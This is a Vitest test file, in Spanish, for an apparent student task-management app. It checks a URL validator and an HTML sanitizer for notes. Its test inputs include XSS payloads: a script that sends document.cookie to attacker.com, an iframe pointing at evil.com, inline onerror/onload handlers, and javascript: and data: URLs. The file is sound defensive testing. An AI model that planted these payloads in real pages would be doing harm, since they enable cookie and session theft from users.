import { describe, it, expect } from 'vitest';
import { validateSecureUrl, sanitizeNoteInput } from '../lib/sanitize';

describe('Refuerzo de Seguridad — validateSecureUrl (TaskDetailDrawer)', () => {
  it('permite URLs válidas con protocolo seguro https://', () => {
    const urls = [
      'https://drive.google.com/file/d/12345/view',
      'https://github.com/usuario/repo-proyecto',
      'https://www.figma.com/design/xyz/CampusFlow',
      'https://notion.so/workspace/entrega-final',
      'https://subdominio.universidad.edu.co/entregas/taller1',
    ];

    urls.forEach(url => {
      const result = validateSecureUrl(url);
      expect(result.isValid).toBe(true);
      expect(result.isSecure).toBe(true);
      expect(result.error).toBeNull();
    });
  });

  it('rechaza estrictamente URLs con protocolo no seguro http://', () => {
    const result = validateSecureUrl('http://inseguro.com/trabajo.pdf');
    expect(result.isValid).toBe(false);
    expect(result.isSecure).toBe(false);
    expect(result.error).toContain('Protocolo no seguro (http://)');
  });

  it('rechaza enlaces sin protocolo o con protocolos peligrosos (javascript:, data:, ftp:)', () => {
    const invalidInputs = [
      'drive.google.com/mi-archivo',
      'javascript:alert("hacked")',
      'data:text/html,<script>alert(1)</script>',
      'ftp://servidor.edu/archivo.zip',
      'file:///C:/Users/Secret.docx',
    ];

    invalidInputs.forEach(input => {
      const result = validateSecureUrl(input);
      expect(result.isValid).toBe(false);
      expect(result.isSecure).toBe(false);
      expect(result.error).toBeTruthy();
    });
  });

  it('permite cadenas vacías para que el estudiante pueda desvincular un enlace voluntariamente', () => {
    const empty1 = validateSecureUrl('');
    expect(empty1.isValid).toBe(true);
    expect(empty1.isEmpty).toBe(true);
    expect(empty1.error).toBeNull();

    const empty2 = validateSecureUrl('   ');
    expect(empty2.isValid).toBe(true);
    expect(empty2.isEmpty).toBe(true);
    expect(empty2.error).toBeNull();

    const nullInput = validateSecureUrl(null);
    expect(nullInput.isValid).toBe(true);
    expect(nullInput.isEmpty).toBe(true);
  });

  it('rechaza URLs con dominios malformados o incompletos', () => {
    const result = validateSecureUrl('https://dominio-sin-tld');
    expect(result.isValid).toBe(false);
    expect(result.error).toContain('dominio web válido');
  });
});

describe('Refuerzo de Seguridad — sanitizeNoteInput (Notes.jsx & notesService)', () => {
  it('elimina completamente etiquetas <script> y su contenido malicioso', () => {
    const malicious = 'Teorema de Gauss: <script>document.location="http://attacker.com?cookie="+document.cookie</script> Demostración paso 1';
    const sanitized = sanitizeNoteInput(malicious);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('document.cookie');
    expect(sanitized).toContain('Teorema de Gauss:');
    expect(sanitized).toContain('Demostración paso 1');
  });

  it('neutraliza etiquetas no autorizadas como <iframe>, <object>, <embed> y <form>', () => {
    const input = 'Resumen: <iframe src="https://evil.com"></iframe><embed src="flash.swf"><form action="/steal"><input></form>Fin del apunte.';
    const sanitized = sanitizeNoteInput(input);
    expect(sanitized).not.toContain('<iframe');
    expect(sanitized).not.toContain('<embed');
    expect(sanitized).not.toContain('<form');
    expect(sanitized).not.toContain('<input');
    expect(sanitized).toContain('Resumen:');
    expect(sanitized).toContain('Fin del apunte.');
  });

  it('neutraliza manejadores de eventos inline peligrosos (onerror, onload, onclick)', () => {
    const input = '<img src="foto.jpg" onerror="alert(1)" onload="fetch(\'/api\')">';
    const sanitized = sanitizeNoteInput(input);
    expect(sanitized).not.toContain('onerror=');
    expect(sanitized).not.toContain('onload=');
  });

  it('neutraliza pseudo-protocolos javascript: y data:text/html', () => {
    const input = 'Ver enlace: [Click](javascript:alert("XSS")) o [Data](data:text/html;base64,PHNjcmlwdD4=)';
    const sanitized = sanitizeNoteInput(input);
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).toContain('javascript_blocked:');
    expect(sanitized).toContain('data_blocked:text/html');
  });

  it('preserva fórmulas matemáticas y símbolos académicos legítimos (<, >, =, ^, etc.)', () => {
    const math = 'Para toda variable x > 0 y y < 10, se cumple que f(x) = x^2 + 3y <= 100.';
    const sanitized = sanitizeNoteInput(math);
    expect(sanitized).toBe(math);
  });

  it('preserva URLs seguras y legítimas en las notas', () => {
    const noteWithUrl = 'Bibliografía: https://es.wikipedia.org/wiki/C%C3%A1lculo_diferencial';
    const sanitized = sanitizeNoteInput(noteWithUrl);
    expect(sanitized).toBe(noteWithUrl);
  });
});
